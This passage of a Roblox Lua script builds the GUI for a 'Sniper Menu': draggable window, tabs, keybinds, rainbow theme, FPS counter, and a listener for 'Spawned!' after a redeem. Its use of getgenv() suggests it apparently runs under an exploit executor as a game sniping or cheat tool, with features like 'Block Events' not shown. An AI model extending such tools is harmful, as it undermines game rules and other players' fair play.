	local titleDot = make("Frame", {
		BorderSizePixel = 0,
		Position = UDim2.fromOffset(18, 20),
		Size = UDim2.fromOffset(10, 10),
	}, titleBar)
	bind(titleDot, "BackgroundColor3", "accent")
	circle(titleDot)

	local titleLabel = createLabel(titleBar, "Sniper Menu", 19, "text", Enum.Font.GothamBold)
	titleLabel.Position = UDim2.fromOffset(38, 0)
	titleLabel.Size = UDim2.new(0, 220, 1, 0)

	local divider = make("Frame", {
		BackgroundTransparency = 0.75,
		BorderSizePixel = 0,
		Position = UDim2.new(0, 0, 1, -1),
		Size = UDim2.new(1, 0, 0, 1),
	}, titleBar)
	bind(divider, "BackgroundColor3", "accent")

	refs.minimize = createButton(titleBar, "—", UDim2.fromOffset(36, 30), function()
		setMinimized(not state.minimized)
	end)
	refs.minimize.AnchorPoint = Vector2.new(1, 0.5)
	refs.minimize.Position = UDim2.new(1, -58, 0.5, 0)

	local closeButton = createButton(titleBar, "×", UDim2.fromOffset(36, 30), function()
		SniperMenu.setVisible(false)
	end)
	closeButton.AnchorPoint = Vector2.new(1, 0.5)
	closeButton.Position = UDim2.new(1, -16, 0.5, 0)
	closeButton.TextSize = 18

	titleBar.InputBegan:Connect(function(input)
		if not isPress(input) then
			return
		end
		local startPointer = getPointer(input)
		local startTarget = state.windowTarget
		startDrag(function(pointer)
			state.windowTarget = clampWindow(startTarget + (pointer - startPointer))
		end, input)
	end)

	-- Corps
	local bodyHeight = MENU_SIZE.Y - TITLE_HEIGHT

	local body = make("Frame", {
		BackgroundTransparency = 1,
		Position = UDim2.fromOffset(0, TITLE_HEIGHT),
		Size = UDim2.fromOffset(MENU_SIZE.X, bodyHeight),
	}, main)

	local sidebar = make("Frame", {
		BorderSizePixel = 0,
		Position = UDim2.fromOffset(10, 10),
		Size = UDim2.fromOffset(SIDEBAR_WIDTH, bodyHeight - 20),
	}, body)
	bind(sidebar, "BackgroundColor3", "panel")
	bindTransparency(sidebar, 0.15)
	corner(sidebar, 12)
	createStroke(sidebar, 0.8)

	local indicator = make("Frame", {
		BackgroundTransparency = 0.8,
		BorderSizePixel = 0,
		Position = UDim2.fromOffset(8, 10),
		Size = UDim2.new(1, -16, 0, TAB_HEIGHT),
	}, sidebar)
	bind(indicator, "BackgroundColor3", "accent")
	corner(indicator, 8)

	local indicatorBar = make("Frame", {
		AnchorPoint = Vector2.new(0, 0.5),
		BorderSizePixel = 0,
		Position = UDim2.fromScale(0, 0.5),
		Size = UDim2.new(0, 3, 0.6, 0),
	}, indicator)
	bind(indicatorBar, "BackgroundColor3", "accent2")
	circle(indicatorBar)

	local versionLabel = createLabel(sidebar, "v" .. VERSION, 11, "muted", Enum.Font.Gotham, Enum.TextXAlignment.Center)
	versionLabel.Position = UDim2.new(0, 0, 1, -28)
	versionLabel.Size = UDim2.new(1, 0, 0, 18)

	local contentFrame = make("Frame", {
		BackgroundTransparency = 1,
		Position = UDim2.fromOffset(SIDEBAR_WIDTH + 20, 10),
		Size = UDim2.fromOffset(MENU_SIZE.X - SIDEBAR_WIDTH - 30, bodyHeight - 20),
	}, body)

	-- Onglets
	local tabLabels = {}

	local function paintTabs(animated)
		for _, name in ipairs(TAB_NAMES) do
			paintObject(tabLabels[name], {
				TextColor3 = state.tab == name and state.theme.text or state.theme.muted,
			}, animated)
		end
	end

	local function showTab(name)
		if state.tab == name then
			return
		end
		local previousName = state.tab
		state.tab = name

		animate(indicator, SMOOTH, {
			Position = UDim2.fromOffset(8, 10 + (table.find(TAB_NAMES, name) - 1) * TAB_STEP),
		})
		paintTabs(true)

		local previous = previousName and pages[previousName]
		if previous then
			animate(previous.page, FAST, { GroupTransparency = 1 })
			task.delay(0.16, function()
				if state.tab ~= previousName and previous.page.Parent then
					previous.page.Visible = false
				end
			end)
		end

		local current = pages[name].page
		current.Visible = true
		current.GroupTransparency = 1
		current.Position = UDim2.fromOffset(0, 14)
		animate(current, SMOOTH, { GroupTransparency = 0, Position = UDim2.fromOffset(0, 0) })
	end

	for index, name in ipairs(TAB_NAMES) do
		local tabButton = make("TextButton", {
			AutoButtonColor = false,
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			Position = UDim2.fromOffset(8, 10 + (index - 1) * TAB_STEP),
			Size = UDim2.new(1, -16, 0, TAB_HEIGHT),
			Text = "",
		}, sidebar)
		addHover(tabButton, 8)

		tabLabels[name] = make("TextLabel", {
			BackgroundTransparency = 1,
			Font = Enum.Font.GothamMedium,
			Position = UDim2.fromOffset(14, 0),
			Size = UDim2.new(1, -14, 1, 0),
			Text = name,
			TextColor3 = WHITE,
			TextSize = 14,
			TextXAlignment = Enum.TextXAlignment.Left,
		}, tabButton)

		tabButton.MouseButton1Click:Connect(function()
			showTab(name)
		end)
	end

	onRefresh(paintTabs)

	-- Pages (Logs en premier pour que ui.log existe)
	local logsScroller = createPage("Logs", contentFrame)
	buildLogsPage(logsScroller)
	buildMainPage(createPage("Main", contentFrame))
	buildThemePage(createPage("Thème", contentFrame))
	buildImportantPage(createPage("Important", contentFrame))
	buildSettingsPage(createPage("Settings", contentFrame))
	buildInfoPage(createPage("Info", contentFrame))

	-- Listener toujours actif : Auto Start + detection "Spawned!" apres redeem
	task.spawn(function()
		pcall(startListener)
	end)

	-- Bouton flottant (mobile)
	refs.reopen = make("TextButton", {
		AutoButtonColor = false,
		BorderSizePixel = 0,
		Font = Enum.Font.GothamBold,
		Position = UDim2.new(0, 12, 0.5, -22),
		Size = UDim2.fromOffset(44, 44),
		Text = "SN",
		TextSize = 15,
		Visible = false,
	}, screenGui)
	bind(refs.reopen, "BackgroundColor3", "panel")
	bind(refs.reopen, "TextColor3", "accent2")
	bindTransparency(refs.reopen, 0.1)
	circle(refs.reopen)
	createStroke(refs.reopen, 0.2, 1.5)
	refs.reopen.MouseButton1Click:Connect(function()
		SniperMenu.setVisible(true)
	end)

	-- Inputs globaux
	table.insert(globalConnections, UserInputService.InputChanged:Connect(function(input)
		if not activeDrag then
			return
		end
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			activeDrag(getPointer(input))
		end
	end))

	table.insert(globalConnections, UserInputService.InputEnded:Connect(function(input)
		if activeDrag and isPress(input) then
			activeDrag = nil
		end
	end))

	table.insert(globalConnections, UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if input.UserInputType ~= Enum.UserInputType.Keyboard then
			return
		end

		if waitingKeybind then
			local waiting = waitingKeybind
			if not waiting.captured then
				waiting.captured = true
				if input.KeyCode ~= Enum.KeyCode.Escape and input.KeyCode ~= Enum.KeyCode.Unknown then
					waiting.setter(input.KeyCode.Name)
					log("Key set to " .. input.KeyCode.Name)
				end
				task.defer(function()
					if waitingKeybind == waiting then
						waitingKeybind = nil
					end
					runListeners(false)
				end)
			end
			return
		end

		if not gameProcessed and input.KeyCode.Name == config.menuKey then
			SniperMenu.setVisible(not state.visible)
		end
	end))

	local camera = workspace.CurrentCamera
	if camera then
		table.insert(globalConnections, camera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
			updateScale(true)
		end))
	end

	-- Par frame : fenetre lisse, rainbow, FPS
	local frameCount = 0
	local fpsTimer = 0

	table.insert(globalConnections, RunService.RenderStepped:Connect(function(deltaTime)
		local blend = config.animations and (1 - math.exp(-deltaTime * 24)) or 1
		local difference = state.windowTarget - state.windowPosition

		if difference.Magnitude > 0.5 then
			state.windowPosition = state.windowPosition + difference * blend
		else
			state.windowPosition = state.windowTarget
		end

		local x = math.floor(state.windowPosition.X + 0.5)
		local y = math.floor(state.windowPosition.Y + 0.5)
		if x ~= state.windowX or y ~= state.windowY then
			state.windowX = x
			state.windowY = y
			main.Position = UDim2.new(0.5, x, 0.5, y)
		end

		if state.rainbow then
			state.rainbowHue = (state.rainbowHue + deltaTime * RAINBOW_SPEED) % 1
			state.rainbowClock += deltaTime
			if state.rainbowClock >= 1 / 30 then
				state.rainbowClock = 0
				state.theme.accent = Color3.fromHSV(state.rainbowHue, 0.75, 1)
				state.theme.accent2 = Color3.fromHSV((state.rainbowHue + 0.08) % 1, 0.45, 1)
				refreshRole("accent", false)
				refreshRole("accent2", false)
				runListeners(false)
			end
		end

		frameCount += 1
		fpsTimer += deltaTime
		if fpsTimer >= 0.5 then
			state.fps = math.floor(frameCount / fpsTimer + 0.5)
			frameCount = 0
			fpsTimer = 0
			if refs.session then
				refs.session.Text = buildSessionText()
			end
		end
	end))

	local env = getgenv and getgenv() or _G
	env.StopSniperMenu = SniperMenu.destroy

	log("Menu loaded")
	showTab("Main")
	SniperMenu.setVisible(true)

	-- Reapplique les options sauvegardees
	task.spawn(function()
		task.wait(1)
		if config.optimize then
			pcall(setOptimize, true)
		end
		if config.blockEvents then
			task.wait(2)
			local ok, reason = setBlockEvents(true)
			if not ok then
				config.blockEvents = false
				runListeners(false)
				log("Block Events failed: " .. tostring(reason), "err")
			end
		end
	end)
end

local ok, err = xpcall(initialize, function(e)
	return debug.traceback(tostring(e))
end)

if not ok then
	warn("[SniperMenu] init failed: " .. tostring(err))
	pcall(SniperMenu.destroy)
end